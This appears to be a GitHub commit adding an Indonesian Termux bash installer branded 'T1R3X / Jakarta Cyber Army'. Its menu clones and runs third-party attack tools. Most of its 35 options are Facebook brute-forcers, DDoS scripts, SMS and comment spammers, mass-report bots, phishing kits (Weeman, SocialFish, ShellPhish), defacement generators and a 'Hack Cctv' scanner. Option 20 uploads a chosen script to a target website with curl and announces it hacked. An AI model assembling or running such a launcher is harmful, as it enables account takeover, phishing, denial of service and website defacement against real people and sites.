59003e536e4f21d49185afdac595372cc70f3434
rikokusuma <45139021+rikokusuma@users.noreply.github.com>
2019-03-05 19:06:12 +0700

    Add files via upload

---
+++ Installer.sh
@@ -0,0 +1,493 @@
+#!/bin/bash
+#version 1.0
+#Mao Ngapain?
+#Mao Recode?
+#Utamakan Izin Dulu^_^
+clear
+#variabels
+b='\033[34;1m'
+g='\033[32;1m'
+p='\033[35;1m'
+c='\033[36;1m'
+r='\033[31;1m'
+w='\033[37;1m'
+y='\033[33;1m'
+sleep 1
+
+echo
+echo
+echo
+echo
+toilet -f future " Welcome To My Tools " | lolcat
+sleep 5
+clear
+toilet -f standard " T1R3X " -F gay
+echo $g"[+]"$r"─────────────────────────────────────────────────────"$g"[+]"
+echo $g" | "$c"••••••••••      |JAKARTA CYBER ARMY|      •••••••••• "$g "| "
+echo $g" | "$r"─────────────────────────────────────────────────────"$g "| "
+echo $g" | "$w" Author      : "$y" T1R3X                                "$g" | "
+echo $g" | "$w" Facebook    : "$y" Riko Kusuma                          "$g" | "
+echo $g" | "$w" No WhatsApp : "$y" 089638517347                         "$g" | "
+echo $g" | "$w" Github      : "$y" http://github.com/rikokusuma         "$g" | "
+echo $g" | "$w" Thanks To   : "$y" All Member Jakarta Cyber Army        "$g" | "
+echo $g"[+]"$r"─────────────────────────────────────────────────────"$g"[+]"
+
+###################################################
+# CTRL + C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -b $g"[#]> (Ctrl + C ) Detected, Trying To Exit ...."
+echo -b $g"[#]> MAKASIH UDH PAKE TOOLS GUE "
+sleep 1
+echo ""
+echo -b $g"[#]> T1R3X"
+
+echo -b $g"[#]> See you Again :)..."
+sleep 1
+exit
+}
+
+lagi=1
+while [ $lagi -lt 6 ];
+do
+echo""
+echo""
+echo""
+echo $b"1. AOC SPAMMER "
+echo $b"────────────────────────────────────────────────"
+echo $g"2. LITEDDOS "
+echo $g"────────────────────────────────────────────────"
+echo $p"3. DDOS Torshammer "
+echo $p"────────────────────────────────────────────────"
+echo $c"4. BruteForce Facebook MBF "
+echo $c"────────────────────────────────────────────────"
+echo $r"5. BruteForce Facebook Iqbalz "
+echo $r"────────────────────────────────────────────────"
+echo $w"6. Cloning Yahoo "
+echo $w"────────────────────────────────────────────────"
+echo $y"7. Bot Komen Facebook "
+echo $y"────────────────────────────────────────────────"
+echo $b"8. Auto Report Facebook "
+echo $b"────────────────────────────────────────────────"
+echo $g"9. Profile Guard Facebook "
+echo $g"────────────────────────────────────────────────"
+echo $p"10. IesDEFACE "
+echo $p"────────────────────────────────────────────────"
+echo $c"11. LITESCRIPT "
+echo $c"────────────────────────────────────────────────"
+echo $r"12. Script Deface Creator "
+echo $r"────────────────────────────────────────────────"
+echo $w"13. Phising Game "
+echo $w"────────────────────────────────────────────────"
+echo $y"14. Tools BAJINGANv6 "
+echo $y"────────────────────────────────────────────────"
+echo $b"15. Tools Mr.Cakil "
+echo $b"────────────────────────────────────────────────"
+echo $g"16. Tools Santet Online "
+echo $g"────────────────────────────────────────────────"
+echo $p"17. Tools Tuan Badut "
+echo $p"────────────────────────────────────────────────"
+echo $c"18. Tools GadoGado "
+echo $c"────────────────────────────────────────────────"
+echo $r"19. LITESPAM "
+echo $r"────────────────────────────────────────────────"
+echo $w"20. Webdav "
+echo $w"────────────────────────────────────────────────"
+echo $y"21. Weeman "
+echo $y"────────────────────────────────────────────────"
+echo $b"22. Social Fish "
+echo $b"────────────────────────────────────────────────"
+echo $g"23. Shell Pish "
+echo $g"────────────────────────────────────────────────"
+echo $p"24. FaceBrute "
+echo $p"────────────────────────────────────────────────"
+echo $c"25. Ubuntu "
+echo $c"────────────────────────────────────────────────"
+echo $r"26. T1R3X-DDOS "
+echo $r"────────────────────────────────────────────────"
+echo $w"27. Login Termux "
+echo $w"────────────────────────────────────────────────"
+echo $y"28. Menstabilkan Jaringan "
+echo $y"────────────────────────────────────────────────"
+echo $b"29. Hack Cctv "
+echo $b"────────────────────────────────────────────────"
+echo $g"30. RED-HAWK "
+echo $g"────────────────────────────────────────────────"
+echo $p"31. Install Lazymux "
+echo $p"────────────────────────────────────────────────"
+echo $c"32. Install Admin Finder "
+echo $c"────────────────────────────────────────────────"
+echo $r"33. Instabot "
+echo $r"────────────────────────────────────────────────"
+echo $w"34. JOOMSCAN "
+echo $w"────────────────────────────────────────────────"
+echo $y"35. Spam Sms "
+echo $y"────────────────────────────────────────────────"
+echo $r"00. Keluar "
+echo $g
+read -p " root@T1R3X:~# " pil;
+
+case $pil in
+1) clear
+toilet -f standard " T1R3X " -F gay
+apt update && apt upgrade
+pkg install git
+git clone https://github.com/rootM3eX/AOCSPAMMER
+cd AOCSPAMMER
+sh aocspam.sh
+
+;;
+
+2) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/4L13199/LITEDDOS
+cd LITEDDOS
+python2 liteDDOS.py
+
+;;
+
+3) clear
+toilet -f standard " T1R3X " -F gay
+pkg update
+pkg upgrade
+pkg install python
+pkg install git
+git clone https://github.com/cyweb/hammer
+cd hammer
+python hammer.py
+
+;;
+
+4) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/FR13ND8/mbf
+cd mbf
+python2 MBF.py
+
+;;
+
+5) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/IqbalzNoobs/fb-brute
+cd fb-brute
+python2 brute.py
+
+;;
+
+6) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/FR13ND8/EmailVuln
+cd EmailVuln
+python2 vuln.py
+
+;;
+
+7) clear
+toilet -f standard " T1R3X " -F gay
+pip2 install mechanize
+git clone https://github.com/Senitopeng/Botkomena.git
+cd Botkomena
+python2 botkomena.py
+
+;;
+
+8) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/IlayTamvan/Report
+cd Report
+unzip Report.zip
+python2 Report.py
+
+;;
+
+9) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/FR13ND8/ProfileGuardFb
+cd ProfileGuardFb
+php guard.php
+
+;;
+
+10) clear
+toilet -f standard " T1R3X " -F gay
+apt install git
+apt install bash
+pip2 install bash
+git clone https://github.com/ALX-04/iesDEFACE
+mv iesDEFACE $HOME
+cd $HOME/iesDEFACE
+bash iesDeface.sh
+
+;;
+
+11) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/4L13199/LITESCRIPT
+cd LITESCRIPT
+python2 LITESCRIPT.py
+
+;;
+
+12) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/Ubaii/script-deface-creator
+cd ~/script-deface-creator
+python2 create.py
+
+;;
+
+13) clear
+toilet -f standard " T1R3X " -F gay
+pkg install git
+pkg install python2
+git clone https://github.com/senitopeng/PhisingGame.git
+mv PhisingGame $HOME
+cd $HOME/PhisingGame
+python2 phising.py
+
+;;
+
+14) clear
+toilet -f standard " T1R3X " -F gay
+pkg update
+pkg upgrade
+pkg install pyhton2
+pip2 install --upgrade pip
+pkg install toilet
+pip2 install termcolor
+pip2 install lolcat
+pkg install git
+git clone https://github.com/DarknessCyberTeam/BAJINGANv6
+cd BAJINGANv6
+sh BAJINGAN.sh
+
+;;
+
+15) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/Mrcakil/mrcakil
+cd mrcakil
+chmod +x tools
+./tools
+
+;;
+
+16) clear
+toilet -f standard " T1R3X " -F gay
+apt update && upgrade
+apt istall python2
+apt install git
+git clone https://github.com/Gameye98/santet-online
+cd santet-online
+python2 santet.py
+
+;;
+
+17) clear
+toilet -f standard " T1R3X " -F gay
+apt update && apt upgrade
+pkg install python python2 vim figlet curl
+pkg install php
+pip2 install lolcat
+pkg install git
+git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv1
+cd TOOLSINSTALLERv1
+chmod +x Tuanb4dut.sh
+sh Tuanb4dut.sh
+
+;;
+
+18) clear
+toilet -f standard " T1R3X " -F gay
+apt update && apt upgrade
+apt install ruby
+apt install lolcat
+apt install git
+git clone https://github.com/Senitopeng/GadoGado.git
+mv GadoGado $HOME
+cd $HOME/GadoGado
+bash gado
+
+;;
+
+19) clear
+toilet -f standard " T1R3X " -F gay
+pkg install python2
+pkg install php
+pkg install cowsay
+pkg install toilet
+pkg install ruby
+gem install lolcat
+pkg install git
+git clone https://github.com/4L13199/LITESPAM.git
+mv LITESPAM $HOME
+cd $HOME/LITESPAM
+sh LITESPAM.sh
+
+;;
+
+20) clear
+toilet -f standard " T1R3X " -F gay
+cd /data/data/com.termux/files/home
+read -p "[?] Masukan Nama Script => " sc;
+read -p "[?] Masukan Web Target => " T;
+curl -T /sdcard/$sc $T
+echo "[!] Terhack => " $T/$sc | lolcat
+
+;;
+
+21) clear
+toilet -f standard " T1R3X " -F gay
+apt install git
+apt install php
+git clone https://github.com/evait-security/weeman.git
+mv weeman $HOME
+cd $HOME/weeman
+python2 weeman.py
+
+;;
+
+22) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/UndeadSec/SocialFish.git
+cd SocialFish
+chmod +x *
+pip2 install -r requirements.txt
+python2 SocialFish.py
+
+;;
+
+23) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/thelinuxchoice/shellphish.git
+cd shellphish
+bash shellphish.sh
+
+;;
+
+24) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/N1ght420/FaceBrute
+cd FaceBrute
+python fb.py
+
+;;
+
+25) clear
+toilet -f standard " T1R3X " -F gay
+apt update && apt upgrade
+apt install git
+apt install wget
+apt install proot
+git clone https://github.com/Neo-Oli/termux-ubuntu.git
+mv termux-ubuntu $HOME
+cd $HOME/~/termux-ubuntu
+chmod +x ubuntu.sh
+sh ubuntu.sh
+
+;;
+
+26) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/rikokusuma/DDOS
+cd DDOS
+python2 T1R3X-DDOS.py
+
+;;
+
+27) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/Harisgitama/termux-loginv2fx.git
+cd termux-loginv2fx
+python2 setup.py
+cd $HOME
+python2 useradd.py
+
+;;
+
+28) clear
+toilet -f standard " T1R3X " -F gay
+ping 8.8.8.8
+
+;;
+
+29) clear
+toilet -f standard " T1R3X " -F gay
+apt update && apt upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/kancotdiq/ipcs
+cd ipcs
+python2 scan.py
+
+;;
+
+30) clear
+toilet -f standard " T1R3X " -F gay
+apt update && apt upgrade
+apt install php git
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+
+;;
+
+31) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/Gameye98/Lazymux
+cd Lazymux
+python2 lazymux.py
+
+;;
+
+32) clear
+toilet -f standard " T1R3X " -F gay
+apt update && apt upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/AdheBolo/AdminFinder
+ls
+cd AdminFinder
+chmod 777 AdminFinder.py
+python2 AdminFinder.py
+
+;;
+
+33) clear
+toilet -f standard " T1R3X " -F gay
+apt install git
+git clone https://github.com/verluchie/instabot.py
+cd instabot.py
+pip2 install -r requirements.txt
+python2 example.py
+
+;;
+
+34) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/rezasp/joomscan.git
+cd joomscan
+perl joomscan.pl
+
+;;
+
+35) clear
+toilet -f standard " T1R3X " -F gay
+git clone https://github.com/Amriez/gcospam
+cd gcospam
+sh install.sh
+sh gco.sh
+
+;;
+
+00) toilet -f standard " T1R3X " -F gay
+echo $g"Keluar....."
+exit
+;;
+
+esac
+done
+done
